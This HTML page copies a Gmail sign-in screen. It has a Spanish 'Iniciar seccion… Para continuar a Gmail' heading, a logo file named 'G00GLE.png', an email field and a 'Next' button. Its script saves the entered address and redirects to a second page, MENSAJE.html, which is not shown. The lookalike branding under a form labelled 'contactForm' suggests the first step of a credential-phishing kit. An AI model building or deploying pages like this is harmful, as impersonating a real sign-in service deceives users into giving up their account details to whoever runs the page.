<!DOCTYPE html> <html lang="es"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <title>Contacto</title> <style>        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f0f2f5; } 
        .container { width: 100%; max-width: 400px; padding: 40px; background: white; border-radius: 8px; border: 1px solid #dadce0; box-sizing: border-box; } 
        h1 { font-size: 24px; font-weight: 500; margin-bottom: 10px; text-align: center; } 
        p { text-align: center; color: #3c4043; margin-bottom: 30px; font-size: 16px; } 
        .input-group { position: relative; margin-bottom: 10px; } 
        input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; } 
        input:focus { outline: 2px solid #1a73e8; border: 1px solid transparent; } 
        .forgot { color: #1a73e8; font-weight: 600; font-size: 14px; cursor: pointer; display: inline-block; margin-bottom: 30px; } 
        .guest-mode { margin: 10px 0 30px 0; font-size: 14px; color: #5f6368; line-height: 1.5; } 
        .guest-mode a { color: #1a73e8; text-decoration: none; font-weight: 600; } 
        .footer-btns { display: flex; justify-content: space-between; align-items: center; margin-top: 20px; } 
        .create-acc { color: #1a73e8; font-weight: 600; cursor: pointer; font-size: 14px;} 
        .next-btn { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 600; cursor: pointer; font-size: 14px; } 
        .next-btn:hover { background-color: #1557b0; } 
        .logo { width: 75px; margin-bottom: 10px; }
        h1 { font-size: 24px; font-weight: 400; margin-bottom: 15px; color: #202124; } </style>  </head> <body> 
    
      <div class="container"> <center> 
         <img src="G00GLE.png" class="logo" alt="R'Cell"> </center> 
         
       
     <h1>Iniciar seccion</h1> 
     <p>Para continuar a Gmail </p> 
     <form id="contactForm"> 
         <div class="input-group"> 
             <input type="email" id="email" name="email" placeholder="Correo electrónico" autocomplete="email" required > 
             

 
 
         <div class="forgot">¿Olvidaste tu correo electronico gmail?</div> 
        <div class="guest-mode"> 
            No es tu computadora? Usa el modo invitado para iniciar seccion de forma privada. <br> 
            <a href="#">Mas informacion</a> 
        </div> 
        <div class="footer-btns"> 
            <div class="create-acc">Crear cuenta</div> 
            <button type="submit" class="next-btn" id="nextBtn">Next</button> 
        </div> 
    </form>
</div> 
                 <script> document .getElementById("contactForm") .addEventListener("submit", function(event) { event.preventDefault(); const email = document.getElementById("email").value.trim(); if (!email) { return; } sessionStorage.setItem("contactEmail", email); window.location.href = "MENSAJE.html"; }); </script> </body> </html>
